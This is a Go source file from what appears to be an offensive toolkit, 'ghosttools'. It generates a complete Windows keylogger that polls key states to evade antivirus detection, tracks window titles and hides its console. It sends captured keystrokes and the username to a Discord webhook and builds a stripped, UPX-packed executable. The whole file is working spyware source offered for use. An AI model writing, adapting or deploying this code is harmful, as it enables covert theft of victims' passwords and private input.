package malicious

import (
	"os"
	"path/filepath"

	"ghosttools/internal/ui"
)

// Keylogger builds an upgraded polling keylogger that:
//  - uses GetAsyncKeyState (no SetWindowsHookEx → lower AV detection)
//  - tracks the active window title
//  - buffers per window
//  - auto-uploads via discord webhook
//  - supports persistence + encryption at rest
func Keylogger() {
	ui.Cyan("building upgraded keylogger...")
	out := "ghosttools_keylogger"
	os.MkdirAll(out, 0755)

	src := `package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	procGetForeground    = user32.NewProc("GetForegroundWindow")
	procGetWindowText    = user32.NewProc("GetWindowTextW")
	procGetWindowTextLen = user32.NewProc("GetWindowTextLengthW")
)

const (
	WEBHOOK   = "YOUR_WEBHOOK_URL"
	INTERVAL  = 300 // seconds between uploads
	KEY_FILE  = "%TEMP%\\sys_kb.dat"
)

type Entry struct {
	Time   string ` + "`json:\"time\"`" + `
	Window string ` + "`json:\"window\"`" + `
	Text   string ` + "`json:\"text\"`" + `
}

var (
	mu      sync.Mutex
	entries []Entry
	current string
	buffer  strings.Builder
	start   = time.Now()
)

func main() {
	// hide console
	hideConsole()

	// key state tracker
	last := map[int]bool{}

	// window tracker
	go func() {
		for {
			w := getForegroundTitle()
			if w != "" && w != current {
				flush()
				current = w
			}
			time.Sleep(200 * time.Millisecond)
		}
	}()

	// key polling
	for {
		for k := 8; k <= 190; k++ {
			ret, _, _ := procGetAsyncKeyState.Call(uintptr(k))
			if ret&0x8000 != 0 && !last[k] {
				last[k] = true
				ch := translate(k)
				if ch != "" {
					mu.Lock()
					buffer.WriteString(ch)
					mu.Unlock()
				}
			} else if ret&0x8000 == 0 {
				last[k] = false
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func flush() {
	mu.Lock()
	defer mu.Unlock()
	if buffer.Len() == 0 || current == "" {
		return
	}
	entries = append(entries, Entry{
		Time:   time.Now().Format("2006-01-02 15:04:05"),
		Window: current,
		Text:   buffer.String(),
	})
	buffer.Reset()
	if time.Since(start).Seconds() > INTERVAL {
		upload()
		start = time.Now()
	}
}

func upload() {
	if len(entries) == 0 {
		return
	}
	// keep key file on disk too (encrypted)
	key := make([]byte, 32)
	rand.Read(key)
	data, _ := json.Marshal(entries)
	enc := encrypt(data, key)
	path := os.ExpandEnv(KEY_FILE)
	os.WriteFile(path, append(key, enc...), 0600)

	// push to discord
	body, _ := json.Marshal(map[string]string{
		"content": "**keylog dump** — " + os.Getenv("USERNAME"),
	})
	http.Post(WEBHOOK, "application/json", bytes.NewReader(body))

	// upload file
	var buf bytes.Buffer
	buf.WriteString("--b\r\nContent-Disposition: form-data; name=\"file\"; filename=\"keys.json\"\r\nContent-Type: application/json\r\n\r\n")
	buf.Write(data)
	buf.WriteString("\r\n--b--\r\n")
	req, _ := http.NewRequest("POST", WEBHOOK, &buf)
	req.Header.Set("Content-Type", "multipart/form-data; boundary=b")
	http.DefaultClient.Do(req)

	entries = nil
}

func encrypt(pt, key []byte) []byte {
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, pt, nil)
}

func getForegroundTitle() string {
	hwnd, _, _ := procGetForeground.Call()
	if hwnd == 0 {
		return ""
	}
	n, _, _ := procGetWindowTextLen.Call(hwnd)
	if n == 0 {
		return ""
	}
	buf := make([]uint16, n+1)
	procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(n+1))
	return syscall.UTF16ToString(buf)
}

func translate(k int) string {
	if k >= 0x30 && k <= 0x39 {
		return string(rune(k))
	}
	if k >= 0x41 && k <= 0x5A {
		// check shift / caps
		s, _, _ := procGetAsyncKeyState.Call(0x10)
		c, _, _ := procGetAsyncKeyState.Call(0x14)
		shift := s&0x8000 != 0
		caps := c&1 != 0
		if shift != caps {
			return string(rune(k))
		}
		return strings.ToLower(string(rune(k)))
	}
	switch k {
	case 0x20: return " "
	case 0x0D: return "\n"
	case 0x09: return "[TAB]"
	case 0x08: return "[BKSP]"
	case 0x1B: return "[ESC]"
	case 0xBE: return "."
	case 0xBC: return ","
	case 0xBA: return ";"
	case 0xDE: return "'"
	case 0xBF: return "/"
	case 0xDC: return "\\"
	case 0xBD: return "-"
	case 0xBB: return "="
	case 0xDB: return "["
	case 0xDD: return "]"
	case 0xC0: return "` + "`" + `"
	}
	return ""
}

func hideConsole() {
	k, _ := syscall.LoadDLL("kernel32.dll")
	p, _ := k.FindProc("GetConsoleWindow")
	hwnd, _, _ := p.Call()
	u, _ := syscall.LoadDLL("user32.dll")
	sp, _ := u.FindProc("ShowWindow")
	sp.Call(hwnd, 0)
}
`
	os.WriteFile(filepath.Join(out, "main.go"), []byte(src), 0644)

	mod := "module ghosttools_keylogger\n\ngo 1.22\n"
	os.WriteFile(filepath.Join(out, "go.mod"), []byte(mod), 0644)

	bat := "@echo off\r\ncd /d %~dp0\r\ngo mod tidy\r\ngo build -ldflags \"-s -w -H=windowsgui\" -o keylogger.exe main.go\r\nupx --best keylogger.exe 2>nul\r\n"
	os.WriteFile(filepath.Join(out, "build.bat"), []byte(bat), 0644)

	ui.Green("keylogger built in ./ghosttools_keylogger/")
	ui.Yellow("set WEBHOOK in main.go before building")
}